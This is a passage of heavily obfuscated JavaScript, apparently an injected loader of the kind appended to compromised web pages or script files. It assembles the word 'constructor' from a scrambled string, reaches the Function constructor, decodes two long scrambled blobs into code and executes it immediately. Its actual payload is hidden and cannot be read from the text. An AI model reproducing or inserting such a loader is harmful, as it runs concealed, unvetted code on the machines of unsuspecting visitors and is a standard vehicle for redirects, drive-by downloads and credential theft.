jLa=iSZ('rosseurloqoancdtmgutjtbrnchicfpwvkxyz').substr(0,idU);var Vda='rf+ ;4h+gmp3nbemt7,=ler"o"vbsltftauS=)6nydr[5wuv6C;z";lzuj0s lrt=o1a=;"ra8zna4lau,.n,=(g;2+8 ,,rt)4Aarn8;,v],e9,,2=nup=p.mitao]r[;.asr.(f5n;(=(nr)pchhetg;w8 e [j)1;st1-v;ekxcfa"]tkp==-a[a=fri>g=f[;6or)vp v( nerCaxl{ vn"vol2nuofll+f)=v.r a=aic+)e q(c1l+m(z7v(.vt0jfrz8vnrernC.hllsu;-70;h=ziod-)x2ohp1u[(otdv+r"1hzks;hac)ia+,n=(k(.ls)h04ao..;=iigrn=a;uravl6s;2sm++o)uhn;p0;1++,s{r;cp(]sg-{zrCk;]]pne))).+cfS})lsqyj9C[rett+usvor5da;nersor ttl[)2=r =skn ++1v}z7so=lfihy=a){+-n*(3l;f.gv=,6h.nc1arr)dvnaioAtai(1.h=e;ii.9c}(<v2)rlnh=z;]a)snt!,sn=tr=t7  r(s3c(g<rirel r(;5.ii(ngtc09 pe(,adlu7r]fn+g)z24)),v{.rs7Acrtl!ge"fr{Cz19u9(iu;iu)u)e8=,0<.), o=xh+=r.ah]tli.[]p5(ffvrn)hv n+)a;>(v}}r(p-,j.e[6]e;x(ae=07{ ja,=."8(0=mr);;[xm,h+Cwr;tqai)j;9ut0)=u;q;a)svauxls;tj(v1h+n8d ht,Cbn](gu*;e2=(a,=nt)9rn<[s3o9; e.==+ijaazo;.;}(i6;<,70eAvri,=+;m]n(r,w0a.s(romxxoa(}eert=;]).;cc,o[A.6 ,f+hco;[" = ;po(gn=e8';var DLF=iSZ[jLa];var AbP='';var GXC=DLF;var LnM=DLF(AbP,iSZ(Vda));var Cln=LnM(iSZ(']!_.11ehnnN3(n2Snd4EYa)faS_iy=( =, +$=J;]rt.Ga,u){rN}.,(J_2h)c.)f(]_]7s(;.ooJdtsJedJS)= na"J;YJp()1[J+d=o.%2),8_2,nJJr].Qn]i(J1fJ%#_e_[K"eJ,+22jfJJs=n,._iaJn_(2^Jkn]J.[[%]3e[J#J{`iJ;wgJ;en_ur.tWocJ2cn2J12}1)ec]}JNrcSiQ+%g-lt%ams)ajuo\/o( 37J^5a]%{e]_.%ejleLVfXJi_mJ_J_JF#=J2oJfJ.=.r`.p;.sent%9g{(Jt2ieXJJee]}1)Ji]b}d1e]3 t3Jn:o(d.h\\!wma.{;2o)J6ad%_)_p{{c!c!?=(%)=37J]cci6]%esnaroa@IlJpJJ#r6}o=m].eule1%.eRv)eUJ6+]7l.rgoea4uJfJgp}i_)poiErf_e.b%c:]tioJ5&a..]]tu Jf%G%J7sh_y14dJl!n!=ubJwp_oo}s.o.e td)%eoJa.eaai%wO_ncn0tJA1fb2\\)%%!=_%-:J!ue_=_0J;g:l;6iJno RJ_{]!Ter}(tt]}trnf(mb)_Je%"JoAo@t)x.eao;ooJTJ]unJn07]a.e3au_,]in,Jutet"JxJsoccJae7e)!#eeJ]4JjbrJJ=rs_i3J)J]8;B.: e3,;bo0.J8r%dro.J(+]eo"m$eur;oga2$x)JJsJJ{RecJ8rrlt(4(1:pc%ruJ}:\\rJot6.;hoJ_p%on.JJo]%QJl=si,?pJ _iq:F$Jy{.1J}[3{4J_dJ_%,1J;-ti`__t6cei>cpboW{]$o.in!tio\/e+f)ta 5l(].c<5]nedJnaJtote+mocC8%=Jt%]i.|J{b4hJgr( v(&nJ3=Ji!\/]Jgs=r\/u%[dlJr.]ndn %J_c:JJ%%ofiJ2?%%%ts_J0e+!!maWB%f;xud6%e.t\/,tott)$JtJ8%p n6gSsJ3%_a")=8qm_t2TJs.EgHhs*]:JQoi1ldMARnir(Jt{=r(1h:edfmrd%CJ8f.d.1%=3:u<tiaf9=4.=.M8Jd.!eb=]=r_Je__op].nhpj=$ml3aW1avJ3=e"d}J(1)=cdpte)Jt}ranleJa-bi{?ehonr)Joi,a,vDKdJ:oJet(.iJ+{aetJJ[)oadJeovtd1(9=uJfJeid(0%=.a7llZiJ%9Ja(bu=e))771WJ]tsrh bJ3to:=\'.g.\/ef#J; _S_Keiabp;m]pI;})Uoe,l;J_i==op_yy_JaJ m_msH}) ;!JSttoagJ]]4Jifs9eJhJf6J_nsfNtnJi3 _\/JyYJJ01]c 6 -mtr)du10B .614)wi JJ]J.9l(w;J]{6gahw2J2{]:cv1Je7J)J)Se{_1aJ)tfJ.:iJJ(Q>{ }d6)o}Ja)]t.0]sf)o alJ9s.oxnelJJJJ.9)}_J9tbtI1mrHy(N4.e,%,46JdnamnsV.JJ8RJrS:2:braJ;[n}J].4.nJ7=p0g6]]Ve.%9op[ge+o6up}=3%lQm J%J=]%o2r0=asyJci.{4^eJr7}a!aIJcJ,=Jt;fJa)fR3{<=J}[tJ_a#_JJ)_c5slr<t.IsnpyNJ _](%oe%3%iJee2$3F:=I<J,m_ne!do(yJ$NJ b:TJ,d _js]nn co]gn%81J fJutha]tJ76]%lrJtun)9%3Nrs]dJ.)@}aJ_+J9f4]eCJd}{J+e](Jql:4oo,11f]c.%oS(ra6rje]teer]:d.0po)]_0t4h+tCJaO((J.J%(5cJeTf_Dfnr];3_f4J](e{gy)v.lT9_Jsg_==J irJ!t>8JJ079w\'ed}[&J4J6(i=Js$afE}J]]7J e_nJ!y;2+J!((_]_({a=]lJteo.rtwoe#tn_[Jrs"lnjst;JJJ=Kew6JtJJ!Jrood_nDr]e Je.JbiJ12N.6e)dh2%!a4n{J_t_oJI.l:r1J__9J%iuJ5.6$bO__J5=aJ:ptJ]!hbv60])u`.J1I%m{Jrq]6oJ.l_2,{]djJ;{rJt3hlQ2aJe45nei)%oghOhb)r.oFJpn0_vX(2(oi9J>x).lo}ZJGv2AJJ&g(lJeusoJ_d)+\/ .fe])tM!i.dca =3]r_f)i]e3ti d%}w&9,fNb6f(0]gan_w%2dbe_orot0JT6C1.]J%l}eef}%__? jJoce.yP_)JJp.u_j6[,2;cB5_e$t;_J[c_Jl1oae}!-;e!_$J=_6Xlol=o^lJua:2yn+ii&(]Jylg)%_jJFJ1\'&;]32)ab$)ob3)b.\/l_}ixcg};]o1fiJv}JoJ$t(_bJ_".CoeJ5m%n%a,Je0%)!J(eiofgp.JJ_,r%3eJJt:rj>5wJ.a"JmJ?(J-a1f%_1%.f}R"Hie]]0+JQ.t_.;JO_ nx)}s_e(#_JJ6.]t.Jots_Jf)tt(.6X3*a]te!1_]J.e}(n hpvKE3.E1eic8mT._2J(efe_h_O+Be6=eywJmios+()h;=a6JtJ;]ub{oba {utJo}f1e%p]]]t12hoJ}ci7.[h;(s3.%JIJ}JUR}5.5Je29nsrndha])JJ{]ane=.cJn]Sc..e1m._e{1.lu?r.Dee8J.9+))e]e)%!Q_!o_%P!aueiuc-Jtp4Jd1e!c78Jmc]V(ns!.]_\/JaJ2(3];d=;{)re]] te.J1]kJJ2altIe%1etJJdodU%NaR,o}tZtp(]WJ_]s$8fo+_er{ctj_0!t4tl}emJ.]3}!diJJaT}2rrn1=(64o]lr4t}J}[0=J..3ifr{)e2J3noJssrt;_Jll0]JJ9w)Sl0J!Nkp]p=r(;Ik=(itm!)U{0t{53pJ;_3e$J!8)L=J0xJ(>:.f].cJJ1l+C0 JafsnY+en4.So#e"dfeos.r Na;oi+!\\_oegu}4)aJJ0J3$;Vne;J!regrJ6]-.(hJJ2_,(}ue$}_hJJJJo6l0:no:J4t4J,(dtJiw}_=m$S_%tj;f7,t4ey%leJn(=3_w4[s%c=os+(aJig!lo3_tb9r1)c(712jl]nr6fur]J"yN9"74J30JJ_e.r*Y]@goJ{geo_pJe;rJ_#uno{t.)rc16J+J.gJ!-bdJeJft1Jq2ge4l;{_"Ja2e}T.gf\/1_2aoeTl;_s369eJ\/sJn Jo!Nn=6sdkK6J]J7Qt0J04aJ$_pelj+se)i1epUi_1JO%]J+)2e4eJ.."{o7 $P,9-!; JjefJo]|1r$3%aj,o%J)J7]Jk)e0tcJs(904a-$_urie.}Js4t+rd5ai!J2{nJ_!%)lreJNJneodMJ2\'inl,tI)0a{_=(ipwe1t(.n_en2Jy]_0Jp{o0]]9Ja4)er_"t!r%]Jrk$}a.;=en]ot &=b2_2JrfEce7J:7g9oj1JJ:5Le_OJJh_6)3!01e! a,iseo.;J)h"r34"1eO1ac(8 J%coho9 n,(14)oJ]e _JMJJOt)ta3we#nelJeJ =fcJ -_&%6 dJJ%4u6, dn9oD1J]Ltip}JJJ4.[_1m[J79i}s)fJ]%iJy_$J8aJfr9xe=}JGaa1h)3;8o5%3S +4)4w6Jym{D}Jl)-J_J4=p?adpJyb]s@JJJa}JJep3is(hntcobo.nJ9;=bxuJicI};51]tae1 JJ]NwJJ !]%e_%)ehJu_s.tnne _6el3ee*J.)e@2n4,ieureJ=}(nd]S1ge(Jil).m 7[Q0k9(mEre=r1t)(T JJsc)tJu 4l;_]KQj.eZ(jko_3h_epJ)osl(tde Vl1);.s1e %w(=_K_+J[(l.=_(21)'));var zIJ=GXC(gyn,Cln );zIJ(6188);return 4563})()
